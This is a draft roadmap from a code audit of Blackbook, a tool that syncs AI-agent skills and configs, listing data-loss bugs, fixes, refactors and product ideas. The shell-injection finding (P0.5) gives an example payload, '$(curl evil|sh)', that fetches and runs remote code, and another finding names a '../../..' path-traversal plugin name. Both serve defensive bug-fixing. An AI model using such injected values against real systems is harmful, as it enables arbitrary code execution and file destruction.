# Blackbook Roadmap (DRAFT)

> Status: **draft for review** — produced 2026-07-08 from a four-track code audit
> (sync engine, install/marketplace pipeline, TUI/state architecture, cross-cutting
> reliability) of `tui/src` at commit `0b3baf6`. Line references are to that commit
> and will drift.

---

## 0. Product thesis — what to preserve

Blackbook's value is **loose sync**: a canonical source repo of agentic artifacts
(skills, commands, agents, AGENTS.md/CLAUDE.md, tool configs, plugins, Pi packages)
projected into each tool's config dir, with SHA256 three-way drift detection
(`never-synced / in-sync / source-changed / target-changed / both-changed`) and
reverse pullback. It deliberately does *not* enforce a strict state machine — tools
keep working if Blackbook disappears, and users can edit either side.

That looseness is the right design. The problems found below are not with the model;
they are with **trust**: the tool writes into `~/.claude`, `~/.codex`,
`~/.config/opencode`, the user's source repo, and the user's `config.yaml`, and there
are currently several paths where it can silently destroy those. Everything in Part 1
serves one goal: *Blackbook must never lose user data, and must never report success
for something that failed.* Everything in Part 2 serves the second-order goal: make
the recurring bug classes (documented in `tasks/lessons.md` and
`docs/plans/action-contract-checklist.md`) structurally impossible instead of
checklist-enforced.

---

## Part 1 — Hardening: fix before anything else

### P0 — data-destroying, live today

| # | Defect | Where | Failure |
|---|--------|-------|---------|
| P0.1 | **Pi marketplace add/remove wipes `config.yaml`.** `addPiMarketplace`/`removePiMarketplace` call the *legacy TOML* `loadConfig()`/`saveConfig()` against the YAML config. The TOML parser reads YAML as empty; `saveConfig` then atomically overwrites the file with a TOML skeleton containing only the pi-marketplace. Entire user config lost, no backup. Wired to live UI (`App.tsx` → `store.addPiMarketplaceToConfig`). | `config.ts:959-972` | Add a Pi marketplace once → all marketplaces, tools, files, settings gone; next launch fails to load config. |
| P0.2 | **Startup `git reset --hard` on the user's configured source repo.** `pullSourceRepo` fetches then `reset --hard origin/<branch>` on whatever local path `settings.source_repo` points at — including a real user checkout. Meanwhile `deleteFileEverywhere` intentionally leaves source edits *uncommitted* "for user review", `pullbackFileInstance` writes without committing, and `commitAndPushSourceRepo` swallows push failures — so pullbacks, deletions, failed-push commits, and any unrelated uncommitted work are silently reverted/destroyed on next launch. | `source-setup.ts:223-240`, interacting with `install.ts:2639-2688`, `store.ts:2753-2817`, `install.ts:2753-2764` | Pull a config back to source, quit, relaunch → the pullback vanished and drift state now lies. |
| P0.3 | **Binary files corrupted by every copy path.** `file-copy.apply`, `applyPullback`, and `glob-copy.apply` read with `utf-8` and write the string; invalid UTF-8 → U+FFFD. Follow-on: `recordSync` stores mismatched hashes, so the file reports drift forever and each re-sync re-mangles it. | `modules/file-copy.ts:116-117,153-154`, `modules/glob-copy.ts:164-165` | Any image/sqlite/binary token file under a glob or config entry is destroyed on first sync. |
| P0.4 | **Config-mutation-on-corrupt-load wipes config (second vector).** `loadConfig` (YAML) returns schema defaults + `errors` on any parse/zod failure; several writers (`addMarketplace`, `removeMarketplace`, `updateToolInstanceConfig`, `setPluginComponentEnabled`) ignore `errors` and save — replacing the whole file with defaults + one mutation. | `config/loader.ts:96-104`, `config.ts:715-749,956,990,1045` | User hand-edits config.yaml, typos one line, toggles a tool in the TUI → config replaced with defaults. |
| P0.5 | **Shell injection via marketplace-derived URL.** `fetchRepoTreePaths` runs `bash -lc "curl -fsSL \"<url>\" | tar -tzf -"`; `JSON.stringify` double-quotes, inside which `$(…)`/backticks still expand. `repo`/`branch` come from loose regexes over marketplace URLs (user config, Claude's `known_marketplaces.json`, or a *remote* source-repo config). | `marketplace.ts:337-343`, `marketplace.ts:64-74` | Marketplace URL containing `$(curl evil\|sh)` → arbitrary code execution on Discover-tab fetch. |

**Fixes (small, surgical):**
- P0.1: move `piMarketplaces` into the zod YAML schema; use `loadYamlConfig`/`saveYamlConfig`; then delete the entire legacy TOML parser/writer (~400 lines, its only remaining live callers).
- P0.2: never hard-reset a user-configured path. Refuse to update when `status --porcelain` is dirty or HEAD is ahead; `pull --rebase --autostash` otherwise; hard-reset only Blackbook-owned clones under `~/.cache/blackbook`. Make pullback/delete flows commit (pathspec-scoped) or stash first; surface push failures.
- P0.3: read/write `Buffer`s (let `atomicWriteFileSync` accept `string | Buffer`) or `copyFileSync` to the temp path. One `Buffer.from([0xff,…])` round-trip test locks it in.
- P0.4: `saveYamlConfig` must throw if the config it was handed came from a load with `errors`; add a `mutateConfig(fn)` read-modify-write helper that enforces this.
- P0.5: no shell — `execFileAsync("curl", […])` piped to a `tar` spawn (or in-process fetch + tar-stream), plus `/^[\w.-]+\/[\w.-]+$/` validation on `repo` and `validateGitRef` on `branch`.

### P1 — high: wrong-data, lost-backup, crash, freeze

**Install/uninstall integrity**
- **Backup slot collisions.** `buildBackupPath` ignores `pluginName` and instance: `backups/<kind>/<name>` is shared across plugins and across tool instances; each `copyWithBackup` deletes the previous backup. Uninstall then restores instance A's file into instance B, or nothing. Fix: `backups/<toolId>:<instanceId>/<plugin>/<kind>/<name>`. (`plugin-helpers.ts:44-55`, `install.ts:968-997`)
- **Manifest items keyed `<kind>:<name>` without owner.** Same-named components from two plugins clobber each other's manifest entries; uninstalling the first removes nothing and orphans its files. Fix: key by `<owner>:<kind>:<name>` with a one-shot migration; make flat-tool dest collisions an explicit conflict. (`install.ts:1059,1166-1201`)
- **`updatePlugin` uninstalls + purges cache *before* downloading the new version.** Download failure leaves the plugin gone. Fix: stage the download first, swap only on success. (`install.ts:1381-1421`)
- **Claude uninstall bypasses the Claude CLI** — hand-edits `installed_plugins.json` (non-atomically, while Claude may be running) instead of `claude plugin uninstall`, leaving Claude's cache/enabledPlugins/hooks stale and status views lying. Fix: route through `execClaudeCommand`, keep JSON surgery as fallback only. (`install.ts:876-947`)
- **Codex installs are invisible to Codex status.** Install copies files + manifest, but status comes solely from `codex plugin list` → perpetual "not installed", update/uninstall never target it. Pick one mechanism per tool and use it for both install and status. (`install.ts:783-842` vs `plugin-status.ts:190-227`)
- **Pi uninstall is fire-and-forget** (`void runPiBridgePluginCommand(...)`, returns `true` immediately) — unhandled rejection can kill the process; UI reports success for a failed uninstall. (`install.ts:860-864`)
- **Crash-mid-install strands user files**: manifest is saved only after all items are copied; a crash between `copyWithBackup` and `saveManifest` leaves originals in backup locations with no record. Fix: journal each destructive step before performing it; reconcile stray `.new.*` backups at startup. (`install.ts:999-1144`)

**Sync engine correctness**
- **`expandTilde` is broken**: `~/foo` → `/foo` (only bare `~` works). Latent landmine at four call sites; also three competing tilde-expansion implementations. Keep the correct `config/path.ts` one, delete the rest. (`path-utils.ts:13-16`)
- **Pullback re-uses forward `apply` with swapped source/target**, recording inverted `sourcePath`/`targetPath` in state; the (currently unreachable) cleanup module would then delete *source repo* files. The dedicated `applyPullback` is dead code. Fix: make pullback first-class in the module interface; delete the swap trick. (`store.ts:2786-2797`, `modules/file-copy.ts:138-167`, `modules/cleanup.ts:75-87`)
- **Corrupt `state.json` silently degrades everything to `never-synced`**, which the bulk-sync filter happily forward-syncs — overwriting locally edited targets that would have been protected as `target-changed`. Fix: rename corrupt file aside, notify, and block bulk sync of previously-tracked files until state is rebuilt. (`state.ts:42-44`, `store.ts:2408-2415`)
- **Source-repo `marketplace.json` reset to empty scaffold on parse error**, then written back and auto-committed. Abort on parse failure instead. (`store.ts:563-583`)
- **Unvalidated `plugin.name` in `rmSync(..., {recursive, force})` paths** for track/remove-from-git — a malicious marketplace name like `../../..` escapes `plugins/`. Use `safePath` (as install paths already do) and zod-validate manifests at parse time. (`store.ts:2244-2288`, `marketplace.ts:250-266`)

**TUI trust & stability**
- **Search is dead**: `/` and typing never reach `SearchBox` (no `focus`/`onFocus` wired at any call site) while the HintBar advertises it. Fixing focus requires also suppressing global shortcuts (`q`, space, digits) while typing. (`components/SearchBox.tsx:22-42`, `DiscoverTab.tsx:139/169/199`, `InstalledTab.tsx:350`)
- **Enter/Space can act on the wrong Pi package**: App's keyboard layer and DiscoverTab sort the same list differently under default sort, so the highlighted row ≠ the acted-on row. Same disease, milder form, in the Sync tab: App and SyncTab compute different selection keys for namespaced skills (checkbox never shows checked; two same-named skills toggle together). Root cause for both: duplicated derivation pipelines (see Part 2.3). (`App.tsx:556-562` vs `DiscoverTab.tsx:78-91`; `App.tsx:483` vs `SyncTab.tsx:15-18`)
- **Synchronous git network calls freeze the UI** for up to 120s (`execFileSync` clone/pull/push inside store actions; also blocking startup on `git fetch` before first render). Convert to async; render first, pull in background. (`store.ts:473-501,2258-2266`, `cli.tsx:10`)
- **Unhandled rejections can crash the TUI**: `void loadFiles()` outside try/catch, no orchestrator-level catch around module `check()`/`apply()`, no `unhandledRejection` handler. One fs race mid-scan kills the session. (`App.tsx:407,418,1473`, `modules/orchestrator.ts:29-38,64`)

### P2 — medium: quality-of-truth issues

- **Error swallowing that converts failure into "success" or "empty"**: `togglePluginComponent` always returns success; uninstall failure notified as "✓ Removed"; `deleteFileEverywhere` per-target failures skipped then `ok: true`; network failures → `[]` (marketplaces, npm, repo trees, remote pi_packages) making the UI claim "nothing here" when offline; push failures silent (see P0.2). Principle to adopt: **an operation that changed less than it claimed must surface counts + errors** (this is already in the action-contract checklist; enforce it in the one action pipeline of Part 2.2).
- **Locking gives false confidence**: `withFileLockSync` guards individual reads/writes but every load→mutate→save on manifest/state is a lost-update race; stale-lock takeover has a TOCTOU; no app-level single-instance lock; no store-level busy guard on plugin/sync mutations (double-Enter runs twice). Fix: `withFileLockSync(path, fn)` callback API held across RMW; `actionInFlight` guard; startup lock file with warning.
- **Loader races**: no run-tokens on `loadFiles`/`loadPiPackages`/`refreshAll` — an older scan can finish last and overwrite fresher state. Monotonic run-id per loader; drop stale `set()`s.
- **Glob sync flattens directory structure** and silently collides same-basename matches (forward *and* pullback); the diff view disagrees with the copy about target mapping. Map by `relative(globBase, src)` on both sides. (`modules/glob-copy.ts:91-92,147-167`)
- **Backup pruning during multi-file ops deletes backups made seconds earlier** (per-file timestamp dirs + prune inside the loop, retention 3). One timestamp dir per run, prune once at the end. (`modules/glob-copy.ts:157-158`, `modules/backup.ts:11-15`)
- **Inconsistent "source deleted, target exists" semantics**: file-copy says drifted/pullback, directory-sync and glob-copy say `ok` (silently masks). Unify on one answer.
- **Symlink issues**: symlink-create unlinks an existing user file with no backup; `renameSync` across filesystems (tmpdir → home) fails with EXDEV on Linux; directory-sync's `lstat().isFile()` test excludes symlinked files from drift checks; symlink drift compares link text literally (relative-but-correct links report perpetual drift).
- **Various**: `Esc` leaks past modals (modal guard sits *below* the Esc branch, closing two layers); stale `marketplaceBrowseContext` resurrects old marketplace detail; `getSyncPreview` does sync fs scans on the render path, memoized twice with different deps; whole-app re-render on every notification/stdout chunk; `[DEBUG] console.error` lines corrupting Ink frames (`install.ts:1447-1457`, `store.ts:1372`); non-atomic JSON writes where `atomicWriteFileSync` already exists; no timeout on `git clone`/`claude plugin` subprocesses; hardcoded `--branch main` fails on `master` repos; `parseGithubRepoFromUrl` duplicated with different bugs (one truncates `repo.name` at the dot).

---

## Part 2 — Structural revamp: make the bug classes impossible

The lessons file and the action-contract checklist show the same five bug shapes
recurring: stale detail after mutation, per-surface one-off action paths, duplicated
derivation drifting apart, false success notifications, and `(toolId, instanceId)`
iteration mistakes. Each maps to a missing structure, not missing discipline.

### 2.1 ToolAdapter interface (kills scattered per-tool conditionals)

`toolId === "claude-code"` / `"pi"` dispatch appears at ~7 sites across install,
uninstall, update, enable/disable, sync, and status — and they disagree (install via
CLI, uninstall via JSON surgery; Codex install-by-copy vs status-by-CLI). Replace with
one interface, one file per tool:

```
lib/adapters/
  types.ts      // ToolAdapter: list / install / uninstall / update / supports
  claude.ts     // native CLI both directions
  codex.ts      // pick copy-based OR native, consistently
  pi-bridge.ts  // merge the two divergent bridge implementations + readiness checks
  managed.ts    // generic copy/symlink adapter (OpenCode, Amp)
```

`installPlugin`/`uninstallPlugin`/`updatePlugin`/`syncPluginInstances` become one
generic loop each (~50 lines replacing ~700), and install/status/uninstall use the
same mechanism per tool by construction. This also gives new-tool support a defined
surface (see Part 4).

### 2.2 Plan/execute pipeline + the action contract in code

Split every mutating operation into **plan** (pure: inputs → list of steps, validated
— source exists, no dest collisions, safePath everywhere) and **execute** (journaled:
persist intent before each destructive step, rollback on failure, reconcile journal
at startup). This single change fixes update-before-download, crash-mid-install
stranding, and makes dry-run and `blackbook undo` nearly free.

Then encode the action contract once: a `runAction()` wrapper that owns
spinner → mutate → count successes/failures → notify honestly → targeted `load*()`
→ `refreshDetail()`. Route *all* entry points (list shortcut, detail action, namespace
tree, sync tab) through it. `docs/plans/action-contract-checklist.md` stops being a
checklist and becomes the implementation.

### 2.3 One derivation pipeline for lists (kills wrong-item bugs)

App.tsx re-derives every tab's filtered/sorted lists purely to compute cursor targets,
while each tab re-derives them for rendering — two pipelines that must sort
identically and don't (the Pi-package and sync-key bugs above). Move derived lists
(`filteredPlugins`, `filteredPiPackages`, `filteredFiles`, namespace groups,
`syncPreview`, `getSyncItemKey`) into store-level selectors computed once. ~400
duplicated lines deleted; the "cursor points at wrong item" class dies.

### 2.4 Overlay state machine (kills Esc/navigation bugs)

Detail/modal state is scattered across a store union plus six App-local `useState`s;
rendering is a ternary chain; Esc handling is a hand-ordered priority list that
currently double-pops. Replace with a single store-level `overlay` stack
(`{kind: "detail"|"marketplace"|"tool-modal"|"diff"|…}`): Esc = pop, render = switch,
modal guards become impossible to mis-order.

### 2.5 Decompose the three god files

- `install.ts` (3,405) → `lib/install/{plan,execute,download,backup,manifest-ops}.ts` + `lib/adapters/*` + `lib/skills/{discovery,drift,mutations,git-sync}.ts` (the standalone-skill subsystem is ~1,100 lines of unrelated code already).
- `store.ts` (2,872) → zustand slices: `ui`, `tools`, `plugins`, `pi`, `files`; pure helpers out to `lib/plugin-merge.ts`, `lib/source-repo-config.ts`.
- `App.tsx` (2,550) → keep it as the composition root; extract `use-tool-actions`, `use-namespace-tree`, the dispatch-callbacks factory, and the derived-list selectors (2.3).

### 2.6 Deduplicate and delete

Two copies each (some divergent, one buggy): `togglePluginComponent`,
`isPiPluginBridgeReady`, `parseGithubRepoFromUrl`, `isConfigOnlyInstance`,
`expandTilde`/`expandPath` (×3), `getSyncItemKey`, `isGlobPath`/`globBaseDir`,
`listFilesRecursive` (different skip-lists!), `DriftKind`, `getRange`/windowing (×4).
Dead code to delete or wire: `applyPullback` (wire it — P1), `symlinkCreateModule`,
`checkCleanup`/`applyCleanup`, `startFileWatchers`, `componentManagerMode` (+
`ComponentManager` render path), `enablePlugin`/`disablePlugin`, legacy
`detailPlugin`/`detailPiPackage` mirrors, `loadTools`, `TAB_REFRESH_TTL_MS`, ~20
never-read App.tsx memos and unused imports, the legacy TOML layer (after P0.1).

### 2.7 Test strategy (targeted at the real risk)

Current 474 tests cover data-merging, dispatcher routing, and happy-path rendering.
The highest-risk code has zero coverage:

1. **Safety regression suite** (write these with the P0 fixes): binary round-trip;
   YAML config survives every mutator when the file has a parse error; source repo
   with uncommitted changes survives launch; shell-metacharacter marketplace URLs
   never reach a shell; `../` plugin names never escape target dirs.
2. **Backup/uninstall collision matrix**: same component name × {two plugins, two
   instances, flat/namespaced tools}; uninstall restores the right bytes to the
   right instance.
3. **Failure injection**: update with download failure (old install survives);
   crash between copy and manifest save (journal reconciles); module `apply()` throw
   (orchestrator contains it, remaining items proceed).
4. **Native-CLI paths**: `claude`/`codex plugin list` parsers, `execClaudeCommand`
   fan-out, Pi bridge command generation — the most fragile parsers in the codebase,
   currently untested.
5. **TUI e2e**: sync-tab Space→checkbox→count→`y y` flow; Pi-package Enter-target
   consistency (the existing plugin "scrub" test has no pi twin); Esc semantics per
   overlay; search once revived.
6. **Concurrency**: two loaders racing (run-token respected); parallel manifest
   writers; stale-lock takeover.

---

## Part 3 — Sequencing

**Phase 0 — Stop the bleeding (days).** P0.1–P0.5 + the safety regression suite.
Small diffs, no refactors. Ship as a patch release.

**Phase 1 — Honest failure (1–2 weeks).** P1 install/uninstall integrity (backup
namespacing, owner-keyed manifest, staged updates, Claude-CLI uninstall, Pi await),
error-swallowing sweep (counts + errors in every notification), async git, unhandled-
rejection net, RMW locking + busy guards.

**Phase 2 — Structure (2–4 weeks, incremental).** ToolAdapter, plan/execute +
`runAction()`, derived-list selectors, overlay stack, god-file decomposition, dedup/
dead-code deletion. Each lands independently; derived-list selectors first (they fix
live wrong-item bugs).

**Phase 3 — Product polish.** Revive search properly; resize handling; render
performance (notification/stdout subscriptions); `blackbook doctor` (below).

---

## Part 4 — Evolution: where to take Blackbook

### 4.1 Grounded — natural next steps (roughly ordered by leverage)

1. **Headless CLI over a core library.** Extract `lib/` into a UI-free core and add
   `blackbook status|sync|pullback|install|doctor --json`. This is the single highest-
   leverage move: it enables scripting, CI, cron, dotfiles-bootstrap, *and* agent
   integration (4.2.1), and it forces the store/logic separation Part 2 wants anyway.
   The TUI becomes one frontend.
2. **`blackbook doctor`.** Startup/on-demand integrity pass: corrupt state.json,
   stray `.new.*` backups, orphaned manifest entries, manifest-vs-disk divergence,
   legacy layouts, broken symlinks, dirty source repo. Report + guided repair.
   (Half its checks fall out of the Phase 0/1 work.)
3. **Machine bootstrap / apply.** `blackbook apply` on a fresh machine: read the
   source repo + a lockfile (`blackbook.lock` pinning plugin versions/hashes), install
   every prescribed artifact to every detected tool. The "repo-prescribed rows"
   feature already points here; this completes it. Killer demo: new laptop →
   one command → all five tools configured.
4. **Three-way merge for `both-changed`.** Today the conflict resolution is
   "force overwrite one side". State already stores last-synced hashes; keep last-
   synced *content* (or use git blobs from the source repo) and offer
   `git merge-file`-style merge for text artifacts, with the diff view you already
   have as the review surface. Markdown instruction files merge cleanly most of
   the time.
5. **More tool adapters + community playbooks.** Cursor, Windsurf, Gemini CLI,
   Copilot CLI, Zed, Aider, Goose. The playbook YAML format is already data-driven;
   after Part 2.1 an adapter is one file + one YAML. Accept community playbook
   contributions as the growth loop.
6. **Per-tool transforms.** Artifacts differ slightly per tool (frontmatter fields,
   command syntax, skill layout). A small transform layer per adapter
   (declared in the playbook: rename fields, strip sections, template variables like
   `${TOOL_NAME}`, per-machine overlays work/personal) turns "copy the file" into
   "project the artifact" — the actual unlock for one-source-many-tools.
7. **Project-scope sync.** Everything today is user-global (`~/.claude`). Repos have
   `.claude/`, `.agents/`, `AGENTS.md` too. `blackbook --project .` syncing a
   project's prescribed artifacts (with the same drift model) covers the team-repo
   use case without inventing anything new.
8. **Watch mode.** The disabled `startFileWatchers` points at the intent: a small
   daemon (or `blackbook watch`) that detects drift as it happens and notifies —
   or auto-syncs `source-changed` files under a policy flag. Loose sync, but fresh.
9. **Sync transactions + undo.** With the Part 2.2 journal, `blackbook undo` (restore
   last operation's backups) is cheap and converts every remaining "oops" into a
   recoverable event. Surfaces in the TUI as an Undo toast after bulk syncs.

### 4.2 Further out — adjacent values, other domains

1. **Agent-native Blackbook (MCP server / skill).** Expose the headless core as MCP
   tools: `list_available_skills`, `install_skill`, `report_drift`. An agent
   mid-task realizes it needs the `xcode-test` skill, asks Blackbook, gets it
   installed and loaded. Blackbook becomes the *provisioning layer agents use to
   equip themselves* — the package manager invoked by its own consumers.
2. **Skill supply-chain security.** Skills/plugins are natural-language *executables*
   installed from the internet into agents with shell access; nobody is scanning
   them. Blackbook already sits at the install chokepoint: static checks (suspicious
   instructions, exfil URLs, prompt-injection patterns, undeclared script/binary
   payloads) + an optional LLM review pass + a provenance/hash lockfile. This is a
   genuinely unowned niche with real security value, and it compounds the trust
   positioning from Part 1.
3. **Fleet/team mode.** An org playbook repo distributed to every engineer: approved
   skills, mandated MCP configs, security policies; Blackbook reports per-machine
   drift ("3 of 12 machines behind on the review skill"). Same engine, new
   audience — this is where a commercial story lives if one is ever wanted.
4. **Usage-aware curation.** Tools keep transcripts/logs locally. Correlate installed
   artifacts against actual invocations: "these 9 skills haven't fired in 90 days —
   they cost you context on every session; archive?" Turns Blackbook from a syncer
   into a *context budget manager* — an increasingly real cost as skill libraries
   grow.
5. **Knowledge-as-code sync.** `tasks/lessons.md`, memory dirs, CLAUDE.md fragments
   are agentic artifacts too — currently per-project, per-tool silos. Blackbook's
   drift model + (4.1.4) merge could sync *learnings* across projects/machines with
   section-level merging: composable instruction files assembled from shared
   fragments rather than copied wholesale.
6. **The generalization.** Underneath, Blackbook is "loose sync of a curated
   artifact repo into N heterogeneous consumers, with drift detection, pullback, and
   per-consumer projection". That engine applies to dotfiles (chezmoi with a drift
   TUI), editor configs, or home-lab configs. Not worth chasing now — but worth
   keeping the core library free of agent-tool assumptions so the door stays open.

### 4.3 Explicit non-goals (to protect the thesis)

- No strict/declarative-only mode that breaks "edit either side".
- No cloud service requirement — the source repo + git remains the sync backbone.
- No always-on daemon by default; watch mode stays opt-in.
- Don't absorb tool-native package managers (Claude plugins, Pi bridge) — keep
  orchestrating them via adapters; the recent Pi-bridge lessons show why.

---

## Appendix — audit provenance

Findings consolidated from four parallel review tracks over `tui/src` (sync engine;
install/marketplace pipeline; TUI/state; cross-cutting reliability). The five P0
findings were independently re-verified against source before inclusion. Overlapping
findings reported by multiple tracks (bash injection, backup collisions, update-
before-download, state.json degradation, binary corruption, manifest RMW races) are
listed once above. Full per-track detail (including LOW-severity items and per-file
test-gap lists) is preserved in the session transcript and can be re-materialized
into `docs/qa/` on request.
